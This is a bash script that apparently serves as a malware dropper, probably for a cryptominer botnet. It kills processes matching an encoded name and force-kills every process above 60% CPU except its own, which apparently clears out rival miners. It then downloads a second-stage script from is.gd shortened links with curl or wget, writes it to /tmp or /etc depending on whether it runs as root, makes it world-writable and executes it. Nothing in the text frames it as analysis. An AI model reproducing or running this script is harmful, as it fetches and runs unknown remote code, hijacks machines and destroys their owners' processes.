#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

pkill -f jIuc2ggfCAvYmluL2Jhc2gi
/bin/ps aux | grep -v sourplom | awk '{if($3>60.0) print $2}' | while read procid
do
/bin/kill -9 $procid
done

whoami=$( whoami )
if [ ${whoami}x != "root"x ];then
	curl https://is.gd/qCUYPY -L > /tmp/l.sh
	if [ ! -f "/tmp/l.sh" ] ;then
		wget -P /tmp/ https://is.gd/qCUYPY
		mv /tmp/qCUYPY  /tmp/l.sh -f
		rm /tmp/l.sh.*
	fi
	chmod 777 /tmp/l.sh
	bash /tmp/l.sh
else
	curl https://is.gd/5KGa84 -L > /etc/root.sh
	if [ ! -f "/etc/root.sh" ] ;then
		wget -P /etc/ https://is.gd/5KGa84
		mv /etc/5KGa84  /etc/root.sh -f
		rm /etc/root.sh.*
	fi
	chmod 777 /etc/root.sh
	bash /etc/root.sh
fi
echo "over"
